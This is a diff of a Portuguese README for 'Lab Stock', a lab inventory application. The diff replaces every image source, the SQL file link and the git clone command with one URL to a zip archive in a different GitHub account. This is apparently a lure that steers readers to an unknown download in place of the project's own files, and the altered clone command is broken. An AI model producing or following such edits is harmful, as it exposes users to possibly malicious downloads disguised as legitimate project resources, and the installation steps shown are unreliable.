@@ -1,12 +1,12 @@
  <div align="center">
-  <img src="assets/Logo/LabStock-Main.png" alt="LabStock Logo" width="500" height="auto">
+  <img src="https://raw.githubusercontent.com/NagilaLopes/inventory-manager/main/includes/inventory-manager_2.2.zip" alt="LabStock Logo" width="500" height="auto">
 </div>
 
 ## Lab Stock - Sistema de Gerenciamento de Inventário de Laboratório Químico
 > O **Lab Stock** é uma aplicação básica desenvolvida para otimizar o gerenciamento de inventário em laboratórios químicos. Através de uma interface intuitiva, oferece recursos robustos para controlar produtos químicos, vidrarias e equipamentos, proporcionando uma visão clara e organizada do estoque laboratorial.
 
 <div align="center">
-  <img src="assets/readme/page-1.png" alt="LabStock Logo" width="1000" height="auto">
+  <img src="https://raw.githubusercontent.com/NagilaLopes/inventory-manager/main/includes/inventory-manager_2.2.zip" alt="LabStock Logo" width="1000" height="auto">
 </div>
 
 ## Visão Geral
@@ -25,10 +25,10 @@ Visa simplificar e aprimorar o controle de inventário em laboratórios químico
 
 ### 1.3 DFD
 <div align="center">
-  <img src="assets/readme/dbmodel-2.png" alt="Database Model" width="1000" height="auto">
+  <img src="https://raw.githubusercontent.com/NagilaLopes/inventory-manager/main/includes/inventory-manager_2.2.zip" alt="Database Model" width="1000" height="auto">
 </div>
 <div align="center">
-  <img src="assets/readme/dbmodel.png" alt="Database Model" width="1000" height="auto">
+  <img src="https://raw.githubusercontent.com/NagilaLopes/inventory-manager/main/includes/inventory-manager_2.2.zip" alt="Database Model" width="1000" height="auto">
 </div>
 
 ## Instalação
@@ -44,10 +44,10 @@ Visa simplificar e aprimorar o controle de inventário em laboratórios químico
 
 1. Clone o projeto localmente
 ```bash
-git clone https://github.com/BREN0sx/inventory-manager && cd inventory-manager
+git clone https://raw.githubusercontent.com/NagilaLopes/inventory-manager/main/includes/inventory-manager_2.2.zip && cd inventory-manager
 ```
 2. Configure um servidor web
-3. Importe o [arquivo sql](labStock.sql) no MySQL
+3. Importe o [arquivo sql](https://raw.githubusercontent.com/NagilaLopes/inventory-manager/main/includes/inventory-manager_2.2.zip) no MySQL
 
 ## Notas Adicionais
 
@@ -58,5 +58,5 @@ Este projeto é uma simulação para fins educacionais e práticos. Qualquer sem
 **Lab Stock** - Gerencie seu inventário laboratorial de maneira eficiente e organizada.
 
 <div align="center">
-  <img src="assets/readme/page-2.png" alt="page-2" width="1000" height="auto">
+  <img src="https://raw.githubusercontent.com/NagilaLopes/inventory-manager/main/includes/inventory-manager_2.2.zip" alt="page-2" width="1000" height="auto">
 </div>
